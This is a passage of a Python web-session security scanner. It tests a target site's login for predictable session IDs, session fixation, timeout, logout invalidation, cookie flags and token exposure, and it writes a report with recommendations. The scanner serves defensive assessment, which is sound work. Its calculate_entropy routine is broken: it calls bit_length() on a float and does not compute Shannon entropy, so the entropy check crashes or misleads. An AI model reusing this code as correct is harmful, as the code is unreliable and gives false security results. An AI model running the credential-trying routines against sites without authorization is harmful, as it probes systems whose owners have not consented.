        # Collect multiple session IDs
        for i in range(20):
            session = requests.Session()
            response = session.get(f"{self.target_url}{self.login_endpoint}")
            
            # Extract session ID
            for cookie in session.cookies:
                if 'session' in cookie.name.lower():
                    session_ids.append(cookie.value)
                    timestamps.append(time.time())
                    break
            
            time.sleep(0.1)
        
        if not session_ids:
            self.vulnerabilities.append("No session cookies found")
            return
        
        # Test for sequential patterns
        if self.check_sequential_pattern(session_ids):
            self.vulnerabilities.append("Sequential session IDs detected")
        
        # Test for timestamp correlation
        if self.check_timestamp_correlation(session_ids, timestamps):
            self.vulnerabilities.append("Session IDs correlate with timestamps")
        
        # Test entropy
        average_entropy = sum(self.calculate_entropy(sid) for sid in session_ids) / len(session_ids)
        if average_entropy < 3.5:  # Low entropy threshold
            self.vulnerabilities.append(f"Low session ID entropy: {average_entropy:.2f}")
        
        print(f"Collected {len(session_ids)} session IDs")
        print(f"Average entropy: {average_entropy:.2f}")
    
    def check_sequential_pattern(self, session_ids):
        """Check for sequential patterns in session IDs"""
        numeric_ids = []
        for sid in session_ids:
            if sid.isdigit():
                numeric_ids.append(int(sid))
        
        if len(numeric_ids) >= 3:
            differences = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
            # Check if differences are consistent (sequential)
            return len(set(differences)) <= 2  # Allow for minor variations
        
        return False
    
    def check_timestamp_correlation(self, session_ids, timestamps):
        """Check if session IDs correlate with timestamps"""
        for i, sid in enumerate(session_ids):
            if sid.isdigit():
                session_time = int(sid)
                actual_time = int(timestamps[i])
                
                # Check if session ID is close to timestamp
                if abs(session_time - actual_time) < 60:  # Within 1 minute
                    return True
        
        return False
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy"""
        if not data:
            return 0
        
        char_counts = {}
        for char in data:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        entropy = 0
        data_len = len(data)
        
        for count in char_counts.values():
            probability = count / data_len
            if probability > 0:
                entropy -= probability * (probability.bit_length() - 1)
        
        return entropy
    
    def test_session_fixation(self):
        """Test for session fixation vulnerability"""
        print("\nTesting for session fixation...")
        
        # Get initial session
        session = requests.Session()
        response = session.get(f"{self.target_url}{self.login_endpoint}")
        
        initial_cookies = dict(session.cookies)
        
        # Attempt login
        for username, password in self.test_credentials:
            login_data = {'username': username, 'password': password}
            login_response = session.post(f"{self.target_url}{self.login_endpoint}", data=login_data)
            
            if login_response.status_code == 200 and 'error' not in login_response.text.lower():
                # Check if session ID changed
                post_login_cookies = dict(session.cookies)
                
                if initial_cookies == post_login_cookies:
                    self.vulnerabilities.append("Session fixation vulnerability - session ID unchanged after login")
                    print(f"  ⚠️  Session fixation detected with credentials: {username}:{password}")
                else:
                    print(f"  ✓ Session properly regenerated after login")
                break
    
    def test_session_timeout(self):
        """Test session timeout implementation"""
        print("\nTesting session timeout...")
        
        # Login and get valid session
        session = self.get_authenticated_session()
        if not session:
            print("  Could not obtain authenticated session")
            return
        
        # Test immediate access
        response = session.get(f"{self.target_url}/dashboard")
        if response.status_code != 200:
            print("  Could not access protected resource")
            return
        
        print("  Authenticated session obtained")
        
        # Wait and test access after delay
        print("  Waiting 60 seconds to test timeout...")
        time.sleep(60)
        
        response = session.get(f"{self.target_url}/dashboard")
        if response.status_code == 200 and 'login' not in response.text.lower():
            self.vulnerabilities.append("Long session timeout - session still valid after 60 seconds")
            print("  ⚠️  Session still valid after 60 seconds")
        else:
            print("  ✓ Session properly timed out")
    
    def test_concurrent_sessions(self):
        """Test concurrent session handling"""
        print("\nTesting concurrent sessions...")
        
        # Create multiple sessions with same credentials
        sessions = []
        for i in range(3):
            session = self.get_authenticated_session()
            if session:
                sessions.append(session)
        
        if len(sessions) < 2:
            print("  Could not create multiple sessions")
            return
        
        print(f"  Created {len(sessions)} concurrent sessions")
        
        # Test if all sessions remain valid
        valid_sessions = 0
        for i, session in enumerate(sessions):
            response = session.get(f"{self.target_url}/dashboard")
            if response.status_code == 200:
                valid_sessions += 1
        
        if valid_sessions == len(sessions):
            self.vulnerabilities.append("Multiple concurrent sessions allowed")
            print(f"  ⚠️  All {valid_sessions} concurrent sessions remain valid")
        else:
            print(f"  ✓ Only {valid_sessions}/{len(sessions)} sessions remain valid")
    
    def test_logout_invalidation(self):
        """Test session invalidation on logout"""
        print("\nTesting logout session invalidation...")
        
        session = self.get_authenticated_session()
        if not session:
            print("  Could not obtain authenticated session")
            return
        
        # Verify session is valid
        response = session.get(f"{self.target_url}/dashboard")
        if response.status_code != 200:
            print("  Session not valid before logout test")
            return
        
        # Logout
        logout_response = session.get(f"{self.target_url}/logout")
        print(f"  Logout response: {logout_response.status_code}")
        
        # Test if session is still valid after logout
        response = session.get(f"{self.target_url}/dashboard")
        if response.status_code == 200 and 'login' not in response.text.lower():
            self.vulnerabilities.append("Session not invalidated on logout")
            print("  ⚠️  Session still valid after logout")
        else:
            print("  ✓ Session properly invalidated on logout")
    
    def test_cookie_security_attributes(self):
        """Test cookie security attributes"""
        print("\nTesting cookie security attributes...")
        
        session = requests.Session()
        response = session.get(f"{self.target_url}{self.login_endpoint}")
        
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                print(f"  Analyzing cookie: {cookie.name}")
                
                # Check HttpOnly
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    self.vulnerabilities.append(f"Cookie {cookie.name} missing HttpOnly attribute")
                    print("    ⚠️  Missing HttpOnly attribute")
                
                # Check Secure
                if not cookie.secure:
                    self.vulnerabilities.append(f"Cookie {cookie.name} missing Secure attribute")
                    print("    ⚠️  Missing Secure attribute")
                
                # Check SameSite
                samesite = cookie.get_nonstandard_attr('SameSite')
                if not samesite:
                    self.vulnerabilities.append(f"Cookie {cookie.name} missing SameSite attribute")
                    print("    ⚠️  Missing SameSite attribute")
                elif samesite.lower() == 'none':
                    self.vulnerabilities.append(f"Cookie {cookie.name} has SameSite=None")
                    print("    ⚠️  SameSite=None allows CSRF attacks")
                
                print(f"    Secure: {cookie.secure}")
                print(f"    HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
                print(f"    SameSite: {samesite}")
    
    def test_session_token_exposure(self):
        """Test for session token exposure in URLs or referrers"""
        print("\nTesting session token exposure...")
        
        session = self.get_authenticated_session()
        if not session:
            print("  Could not obtain authenticated session")
            return
        
        # Test if session ID appears in URL
        response = session.get(f"{self.target_url}/dashboard")
        
        session_id = None
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                session_id = cookie.value
                break
        
        if session_id:
            # Check if session ID appears in response content
            if session_id in response.text:
                self.vulnerabilities.append("Session ID exposed in response content")
                print("  ⚠️  Session ID found in response content")
            
            # Check URL for session ID
            if session_id in response.url:
                self.vulnerabilities.append("Session ID exposed in URL")
                print("  ⚠️  Session ID found in URL")
    
    def test_cross_domain_sessions(self):
        """Test cross-domain session sharing"""
        print("\nTesting cross-domain session sharing...")
        
        # This would require multiple domains to test properly
        # For now, just check cookie domain settings
        session = requests.Session()
        response = session.get(f"{self.target_url}{self.login_endpoint}")
        
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                if cookie.domain and cookie.domain.startswith('.'):
                    self.vulnerabilities.append(f"Cookie {cookie.name} has overly broad domain: {cookie.domain}")
                    print(f"  ⚠️  Cookie domain too broad: {cookie.domain}")
    
    def get_authenticated_session(self):
        """Get an authenticated session for testing"""
        for username, password in self.test_credentials:
            session = requests.Session()
            login_data = {'username': username, 'password': password}
            
            response = session.post(f"{self.target_url}{self.login_endpoint}", data=login_data)
            
            # Check if login was successful
            if response.status_code == 200 and 'error' not in response.text.lower():
                # Verify we can access a protected resource
                test_response = session.get(f"{self.target_url}/dashboard")
                if test_response.status_code == 200:
                    return session
        
        return None
    
    def generate_security_report(self):
        """Generate comprehensive security report"""
        print("\n" + "="*80)
        print("SESSION MANAGEMENT SECURITY REPORT")
        print("="*80)
        
        if not self.vulnerabilities:
            print("✓ No session management vulnerabilities detected!")
        else:
            print(f"⚠️  {len(self.vulnerabilities)} vulnerabilities detected:")
            print()
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {vuln}")
        
        print("\n" + "="*80)
        print("RECOMMENDATIONS")
        print("="*80)
        
        recommendations = [
            "Use cryptographically secure random session ID generation",
            "Implement proper session timeout (15-30 minutes for sensitive applications)",
            "Regenerate session ID after authentication",
            "Invalidate sessions on logout",
            "Set HttpOnly, Secure, and SameSite cookie attributes",
            "Implement session fixation protection",
            "Limit concurrent sessions per user",
            "Never expose session tokens in URLs or logs",
            "Use HTTPS for all session-related communications",
            "Implement proper session storage and cleanup"
        ]
        
        for i, rec in enumerate(recommendations, 1):
            print(f"{i}. {rec}")
        
        # Save report to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"session_security_report_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write("SESSION MANAGEMENT SECURITY REPORT\n")
            f.write("="*50 + "\n\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("VULNERABILITIES FOUND:\n")
            for vuln in self.vulnerabilities:
                f.write(f"- {vuln}\n")
            
            f.write("\nRECOMMENDATIONS:\n")
            for rec in recommendations:
                f.write(f"- {rec}\n")
        
        print(f"\nDetailed report saved to: {report_file}")

# Example usage
if __name__ == "__main__":
    target = "http://vulnerable-webapp.com"
    
    tester = SessionSecurityTester(target)
    tester.test_session_management_security()
```